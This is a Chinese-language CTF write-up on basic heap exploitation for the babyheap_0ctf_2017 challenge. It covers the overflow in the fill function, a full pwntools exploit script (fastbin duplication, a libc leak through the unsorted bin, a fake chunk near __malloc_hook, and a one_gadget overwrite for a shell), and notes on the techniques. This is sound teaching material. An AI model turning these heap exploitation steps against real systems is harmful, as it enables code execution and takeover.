---
title: Basic-Heap-Exploitation
date: 2022-5-24
tags: 
- Pwn
- CTF

categories:
- CTF

toc: true # 是否启用内容索引
sidebar: none # 是否启用sidebar侧边栏，none：不启用
---





# The Basic of Heap Exploitation

基础堆漏洞利用:
主要知识点：

- fastbin_dup
- fake_chunk
- 劫持__malloc_hook



## babyheap_0ctf_2017

### 0x1 checksec

```bash
[*]
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开，堆题日常操作

### 0x2 Analysis

漏洞点：

```c
__int64 __fastcall sub_E7F(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (int)result >= 0 && (int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
        //重新读取了一个size
      result = sub_138C();
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

在fill的实现函数中，填充的字符size是重新输入的，所以这个地方可以进行溢出



### 0x3 Process

1. 泄漏libc_base
2. 劫持__malloc_hooc(利用偏移)
3. getshell



### 0x4 Some Questions
- 利用偏移制造fake_chunk时,算错
- 泄漏的地址和__malloc_hook相对于libc_base的偏移都可以通过本地调试获取

### 0x4 exp

这个题是参考《CTF竞赛权威指南》进行的一个复现:

```python
from pwn import*


p = process('./babyheap')

context.log_level = 'debug'

def alloc(size):
    p.sendlineafter('Command: ','1')
    p.sendlineafter('Size: ',str(size))

def fill(idx,payload):
    p.sendlineafter('Command: ','2')
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(len(payload)))
    p.sendafter('Content: ',payload)

def free(idx):
    p.sendlineafter('Command: ','3')
    p.sendlineafter('Index: ',str(idx))

def dump(idx):
    p.sendlineafter('Command: ','4')
    p.sendlineafter('Index: ',str(idx))
    p.recvuntil('Content: \n')
    return p.recvline()

def fastbin_dup():
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x80)
    free(1)
    free(2)
	
    payload = cyclic(0x10)
    payload+= p64(0) + p64(0x21)
    payload+= p64(0) + cyclic(0x8)
    payload+= p64(0) + p64(0x21)
    payload+= p8(0x80)
    fill(0,payload)
    //将2号chunk的fd指针改成最后一个大小0x80的4号chunk
    //利用第一个chunk偏移为0的特点在没有泄漏时实现(在实现了tcache机制的libc版本有所不同，系统会先分配一段空间给tcache使用)
    payload = cyclic(0x10)
    payload+= p64(0) + p64(0x21)
    fill(3,payload)
    //更改4号chunk的size区，使得其能绕过检查
    alloc(0x10)
    alloc(0x10)
    //在原4号chunk位置再分配

def leak_libc():
    global libc_base,malloc_hook

    payload = cyclic(0x10)
    payload+= p64(0) + p64(0x91)
    fill(3,payload)
    //4号chunksize改回来
    alloc(0x80)
    free(4)
    leak_addr = u64(dump(2)[:8])
    //释放后来到unsort_bin,fd和bk指向libc地址
    libc_base = leak_addr - 0x3c3b78
	
    malloc_hook = libc_base + 0x3c3b10

    log.info('leak add: 0x%x' % leak_addr)
    log.info('libc base: 0x%x' % libc_base)
    log.info('__malloc_hook add: 0x%x' % malloc_hook)

def pwn():
    alloc(0x60)
    free(4)
    fill(2,p64(malloc_hook - 0x28 + 0x5))
    //利用偏移伪造fake_chunk
    alloc(0x60)
    alloc(0x60)
    //分配到fake_chunk(malloc_hook 附近)
    one_gadget = libc_base + 0x4525a
    fill(6,p8(0)*0x13 + p64(one_gadget))
    //将one_gadget写入hook
    alloc(1)
    p.interactive()

if __name__=='__main__':
    fastbin_dup()
    leak_libc()
    pwn()

```


### 0x6 New Skills
- 利用偏移制造fake_chunk:
一般libc地址最高位为7f，符合fast_bin对size的检查
所以可以通过偏移，将此字节移动到size位实现

- 利用unsort_bin泄漏libc地址
当unsort_bin只有一个chunk时，其fd和bk都指向libc的地址，所以可以通过此，泄漏libc地址
一般需要能够在释放后仍然能够控制或读取此chunk
- 直接通过堆溢出制造实现UAF
核心：在没有tcache机制的的libc下，chunk固定从一个内存页面的开始部分进行分配，所以，对于分配的chunk的地址最后一个字节，是可以推算出来的